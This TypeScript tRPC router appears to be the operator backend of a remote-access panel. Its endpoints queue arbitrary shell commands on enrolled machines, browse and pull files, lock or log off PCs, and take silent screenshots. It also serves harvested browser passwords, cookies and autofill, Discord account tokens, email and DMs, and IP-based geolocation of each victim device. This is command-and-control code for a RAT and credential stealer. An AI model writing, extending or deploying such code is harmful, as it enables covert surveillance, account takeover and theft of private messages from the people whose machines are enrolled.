import { COOKIE_NAME } from "@shared/const";
import { TRPCError } from "@trpc/server";
import { z } from "zod";
import {
  getMonitoredDevice,
  listMonitoredDevices,
  listSessionAudits,
  revokeDevice,
  unrevokeDevice,
} from "./db";
import {
  endAllSessionsForAgent,
  endScreenSession,
  flushScreenAuditWrites,
  getScreenSession,
  requestScreenSession,
} from "./screenRoutes";
import {
  queueRemoteCommand,
  getRemoteCommand,
  listRecentCommands,
  queueFilePull,
  getFilePullRequest,
  queueDirList,
  getDirListRequest,
  queueControlCommand,
  getControlCommand,
} from "./commandRoutes";
import {
  browserDataStore,
  discordDataStore,
  getHeatmapDays,
  resolveGeo,
} from "./browserDataRoutes";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { protectedProcedure, publicProcedure, router } from "./_core/trpc";

export const appRouter = router({
  system: systemRouter,
  auth: router({
    me: protectedProcedure.query(({ ctx }) => ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  devices: router({
    list: protectedProcedure.query(() => listMonitoredDevices()),
    revoke: protectedProcedure
      .input(z.object({ agentId: z.string().min(1) }))
      .mutation(async ({ input, ctx }) => {
        const operatorName = ctx.user?.name || ctx.user?.email || "Administrator";
        const device = await revokeDevice(input.agentId, operatorName);
        endAllSessionsForAgent(input.agentId);
        return { success: Boolean(device), device };
      }),
    unrevoke: protectedProcedure
      .input(z.object({ agentId: z.string().min(1) }))
      .mutation(async ({ input }) => {
        const device = await unrevokeDevice(input.agentId);
        return { success: Boolean(device), device };
      }),
  }),

  screen: router({
    request: protectedProcedure
      .input(z.object({
        agentId: z.string().min(1),
        quality: z.enum(["low", "medium", "high"]).default("medium"),
        maxDurationSeconds: z.number().int().min(60).max(3600).default(600),
        maxBandwidthKbps: z.number().int().min(64).max(4096).default(1024),
      }))
      .mutation(async ({ input, ctx }) => {
        const device = await getMonitoredDevice(input.agentId);
        if (device?.isRevoked) {
          throw new TRPCError({
            code: "FORBIDDEN",
            message: "Device enrollment has been revoked",
          });
        }
        const operator = {
          id: String(ctx.user?.id ?? "admin-1"),
          name: ctx.user?.name || ctx.user?.email || "Administrator",
        };
        const session = requestScreenSession(input.agentId, operator, input);
        return { sessionId: session.id, state: session.state };
      }),
    status: protectedProcedure
      .input(z.object({ sessionId: z.string().min(1) }))
      .query(({ input }) => {
        const session = getScreenSession(input.sessionId);
        return {
          state: session?.state ?? "ended",
          frameAt: session?.frameAt ?? null,
          operatorName: session?.operatorName ?? "Administrator",
          requestedAt: session?.requestedAt ?? null,
          approvedAt: session?.approvedAt ?? null,
          endedAt: session?.endedAt ?? null,
          quality: session?.quality ?? "medium",
          maxDurationSeconds: session?.maxDurationSeconds ?? 0,
          maxBandwidthKbps: session?.maxBandwidthKbps ?? 0,
        };
      }),
    end: protectedProcedure
      .input(z.object({ sessionId: z.string().min(1) }))
      .mutation(({ input }) => {
        const session = endScreenSession(input.sessionId);
        return { state: session?.state ?? "ended" };
      }),
    history: protectedProcedure
      .input(z.object({ agentId: z.string().optional() }).optional())
      .query(async ({ input }) => {
        await flushScreenAuditWrites(input?.agentId);
        const audits = await listSessionAudits(input?.agentId);
        return audits.map((audit) => ({
          id: audit.id,
          sessionId: audit.sessionId,
          agentId: audit.agentId,
          hostname: audit.hostname,
          operatorId: audit.operatorId,
          operatorName: audit.operatorName,
          state: audit.state,
          requestedAt: audit.requestedAt,
          approvedAt: audit.approvedAt,
          endedAt: audit.endedAt,
          durationSeconds: audit.durationSeconds,
        }));
      }),
  }),

  // ── Remote command execution ────────────────────────────────────────────
  commands: router({
    run: protectedProcedure
      .input(z.object({
        agentId: z.string().min(1),
        command: z.string().min(1).max(2048),
      }))
      .mutation(async ({ input }) => {
        const device = await getMonitoredDevice(input.agentId);
        if (!device || device.isRevoked) {
          throw new TRPCError({ code: "FORBIDDEN", message: "Device not available" });
        }
        const cmd = queueRemoteCommand(input.agentId, input.command);
        return { commandId: cmd.id };
      }),
    status: protectedProcedure
      .input(z.object({ commandId: z.string().min(1) }))
      .query(({ input }) => {
        const cmd = getRemoteCommand(input.commandId);
        if (!cmd) throw new TRPCError({ code: "NOT_FOUND", message: "Command not found" });
        return {
          id: cmd.id,
          done: cmd.done,
          stdout: cmd.stdout,
          stderr: cmd.stderr,
          exitCode: cmd.exitCode,
          completedAt: cmd.completedAt,
        };
      }),
    history: protectedProcedure
      .input(z.object({ agentId: z.string().min(1) }))
      .query(({ input }) => {
        return listRecentCommands(input.agentId).map((cmd) => ({
          id: cmd.id,
          command: cmd.command,
          done: cmd.done,
          stdout: cmd.stdout,
          stderr: cmd.stderr,
          exitCode: cmd.exitCode,
          createdAt: cmd.createdAt,
          completedAt: cmd.completedAt,
        }));
      }),
  }),

  // ── File browser & pull ────────────────────────────────────────────────
  files: router({
    listDir: protectedProcedure
      .input(z.object({
        agentId: z.string().min(1),
        path: z.string().min(1).max(1024),
      }))
      .mutation(async ({ input }) => {
        const device = await getMonitoredDevice(input.agentId);
        if (!device || device.isRevoked) {
          throw new TRPCError({ code: "FORBIDDEN", message: "Device not available" });
        }
        const req = queueDirList(input.agentId, input.path);
        return { requestId: req.id };
      }),
    dirStatus: protectedProcedure
      .input(z.object({ requestId: z.string().min(1) }))
      .query(({ input }) => {
        const req = getDirListRequest(input.requestId);
        if (!req) throw new TRPCError({ code: "NOT_FOUND", message: "Request not found" });
        return {
          done: req.done,
          entries: req.entries,
          errorMessage: req.errorMessage,
        };
      }),
    pull: protectedProcedure
      .input(z.object({
        agentId: z.string().min(1),
        remotePath: z.string().min(1).max(1024),
      }))
      .mutation(async ({ input }) => {
        const device = await getMonitoredDevice(input.agentId);
        if (!device || device.isRevoked) {
          throw new TRPCError({ code: "FORBIDDEN", message: "Device not available" });
        }
        const req = queueFilePull(input.agentId, input.remotePath);
        return { requestId: req.id };
      }),
    pullStatus: protectedProcedure
      .input(z.object({ requestId: z.string().min(1) }))
      .query(({ input }) => {
        const req = getFilePullRequest(input.requestId);
        if (!req) throw new TRPCError({ code: "NOT_FOUND", message: "Request not found" });
        return {
          done: req.done,
          ready: req.done && req.data !== null,
          fileName: req.fileName,
          errorMessage: req.errorMessage,
          downloadUrl: req.done && req.data ? `/api/files/${req.id}/download` : null,
        };
      }),
  }),

  // ── PC control (lock / logoff / silent screenshot) ─────────────────────
  control: router({
    lock: protectedProcedure
      .input(z.object({ agentId: z.string().min(1) }))
      .mutation(async ({ input }) => {
        const device = await getMonitoredDevice(input.agentId);
        if (!device || device.isRevoked) {
          throw new TRPCError({ code: "FORBIDDEN", message: "Device not available" });
        }
        const cmd = queueControlCommand(input.agentId, "lock");
        return { commandId: cmd.id };
      }),
    logoff: protectedProcedure
      .input(z.object({ agentId: z.string().min(1) }))
      .mutation(async ({ input }) => {
        const device = await getMonitoredDevice(input.agentId);
        if (!device || device.isRevoked) {
          throw new TRPCError({ code: "FORBIDDEN", message: "Device not available" });
        }
        const cmd = queueControlCommand(input.agentId, "logoff");
        return { commandId: cmd.id };
      }),
    screenshot: protectedProcedure
      .input(z.object({ agentId: z.string().min(1) }))
      .mutation(async ({ input }) => {
        const device = await getMonitoredDevice(input.agentId);
        if (!device || device.isRevoked) {
          throw new TRPCError({ code: "FORBIDDEN", message: "Device not available" });
        }
        const cmd = queueControlCommand(input.agentId, "screenshot");
        return { commandId: cmd.id };
      }),
    status: protectedProcedure
      .input(z.object({ commandId: z.string().min(1) }))
      .query(({ input }) => {
        const cmd = getControlCommand(input.commandId);
        if (!cmd) throw new TRPCError({ code: "NOT_FOUND", message: "Control command not found" });
        return {
          done: cmd.done,
          action: cmd.action,
          screenshotUrl: cmd.done && cmd.screenshotData ? `/api/control/${cmd.id}/screenshot` : null,
          completedAt: cmd.completedAt,
        };
      }),
  }),

  // ── Browser data ──────────────────────────────────────────────────────────
  browser: router({
    getData: protectedProcedure
      .input(z.object({ agentId: z.string().min(1) }))
      .query(({ input }) => {
        const data = browserDataStore.get(input.agentId);
        if (!data) return null;
        return {
          collectedAt: data.collectedAt,
          history: data.history,
          tabs: data.tabs,
          bookmarks: data.bookmarks,
          passwords: data.passwords,
          cookies: data.cookies,
          autofill: data.autofill,
          downloads: data.downloads,
          extensions: data.extensions,
        };
      }),
  }),

  // ── Discord data ──────────────────────────────────────────────────────────
  discord: router({
    getData: protectedProcedure
      .input(z.object({ agentId: z.string().min(1) }))
      .query(({ input }) => {
        const data = discordDataStore.get(input.agentId);
        if (!data) return null;
        return {
          collectedAt: data.collectedAt,
          token: data.token,
          userId: data.userId,
          username: data.username,
          discriminator: data.discriminator,
          email: data.email,
          dms: data.dms,
        };
      }),
  }),

  // ── Geo & heatmap ─────────────────────────────────────────────────────────
  geo: router({
    resolve: protectedProcedure
      .input(z.object({ agentId: z.string().min(1) }))
      .query(async ({ input }) => {
        const device = await getMonitoredDevice(input.agentId);
        if (!device) return null;
        return resolveGeo(device.ipAddress ?? "", input.agentId);
      }),
  }),

  heatmap: router({
    getDays: protectedProcedure
      .input(z.object({ agentId: z.string().min(1), days: z.number().int().min(7).max(35).default(30) }))
      .query(({ input }) => getHeatmapDays(input.agentId, input.days)),
  }),
});

export type AppRouter = typeof appRouter;
